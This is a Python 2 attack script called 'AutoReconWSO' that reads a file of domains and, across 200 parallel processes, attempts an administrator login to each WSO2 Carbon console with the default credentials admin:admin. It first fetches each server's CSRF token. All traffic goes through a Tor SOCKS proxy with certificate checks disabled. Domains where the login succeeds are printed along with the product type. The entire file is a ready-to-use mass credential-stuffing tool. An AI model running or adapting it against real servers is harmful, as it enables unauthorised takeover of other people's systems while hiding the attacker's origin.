#!/usr/bin/python
# -*- coding: utf8 -*-
import urllib2
import sys, os, argparse
from multiprocessing import Pool
import tinys3
import re
import time
import requests
import urllib3
from lxml.html import fromstring
import socket


BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE =range(8)

def has_colours(stream):
    if not hasattr(stream, "isatty"):
        return False
    if not stream.isatty():
        return False # auto color only on TTYs
    try:
        import curses
        curses.setupterm()
        return curses.tigetnum("colors") > 2
    except:
        # guess false in case of error
        return False
has_colours = has_colours(sys.stdout)


def printout(text, colour=WHITE):
        if has_colours:
                seq = "\x1b[1;%dm" % (30+colour) + text + "\x1b[0m"
                sys.stdout.write(seq)
        else:
                sys.stdout.write(text)
printout (" _\/_  _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_  _\/_  ", RED)
print ""
printout (" \/\/  \/\/ \/\/ \/\/ \/\/ \/\/ \/\/ \/\/  \/\/  ", RED)
print ""
print " _\/_                                      _\/_  "
print " \/\/                                      \/\/  "
print " _\/_           AutoReconWSO 1.0           _\/_  "
print " \/\/                                      \/\/  "
printout (" _\/_  _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_  _\/_  ", RED)
print ""
printout (" \/\/  \/\/ \/\/ \/\/ \/\/ \/\/ \/\/ \/\/  \/\/  ", RED)
print ""


printout ("░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄", RED)
print ""
printout ("░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄", RED)
print ""
printout ("░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█", RED)
print ""
printout ("░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░█", RED)
print ""
printout ("░▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░█", RED)
print ""
printout ("█▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒█", RED)
print ""
printout ("█▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█", RED)
print ""
printout ("░█▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█", RED)
print ""
printout ("░░█░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█", RED)
print ""
printout ("░░░█░░██░░▀█▄▄▄█▄▄█▄████░█", RED)
print ""
printout ("░░░░█░░░▀▀▄░█░░░█░███████░█", RED)
print ""
printout ("░░░░░▀▄░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█", RED)
print ""
printout ("░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░█", RED)
print ""
printout ("░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░█", RED)
print ""
printout ("░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░█", RED)
print ""
print ""
printout ("################################################", RED)
print ""
printout ("#", RED)
print ""
printout ("#POTENTIALISATION DE LA CONNERIE EN COURS...", RED)
print ""
printout ("#", RED)
print ""
printout ("################################################", RED)
print ""



def findgitrepo(domain):
    domain = domain.strip()
    requests.adapters.DEFAULT_RETRIES = 1
    urllib3.disable_warnings()

    try : 
        


        prod = requests.get(domain + '/', verify=False, timeout=10, proxies=dict(http='socks5://127.0.0.1:9050', https='socks5://127.0.0.1:9050'))
        tree = fromstring(prod.content)
        title = tree.findtext('.//title')
        if "WSO2+Identity" in prod.text:
            title = title + " - Identity Server"  
        if "WSO2+IoT" in prod.text:
            title = title + " - IoT Server"
        if "WSO2+Application" in prod.text:
            title = title + " - Application Server"      

    except Exception as e:
        title = "?"
	 

    try:
        
        rtoken = requests.post(domain + '/carbon/admin/js/csrfPrevention.js', verify=False, headers={"FETCH-CSRF-TOKEN":"1"},timeout=10, proxies=dict(http='socks5://127.0.0.1:9050', https='socks5://127.0.0.1:9050'))
        token= rtoken.text[-39:]
        
      
        data = {'username':'admin','password':'admin','X-CSRF-Token':token}
        login = requests.post(domain + '/carbon/admin/login_action.jsp', verify=False, data=data, allow_redirects=False,timeout=10, proxies=dict(http='socks5://127.0.0.1:9050', https='socks5://127.0.0.1:9050'))
        
        
        if "loginStatus=true" in str(login.headers):
            
              
    
            
            print domain + " ==> admin:admin (" + title + ")"
        else:
            pass

    except Exception as e:
        
	pass 
   
   

if __name__ == '__main__':
    

    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--inputfile', default='domains.txt', help='Input file')
    parser.add_argument('-o', '--outputfile', default='output.txt', help='Output file')
    parser.add_argument('-t', '--threads', default=200, help='Threads')
    args = parser.parse_args()
    

    
    DOMAINFILE=args.inputfile
    OUTPUTFILE=args.outputfile
    MAXPROCESSES=int(args.threads)
    
    
    
    print("Scanning...")
    pool = Pool(processes=MAXPROCESSES)
    domains = open(DOMAINFILE, "r").readlines()
    pool.map(findgitrepo, domains)
    print("Finished")
 
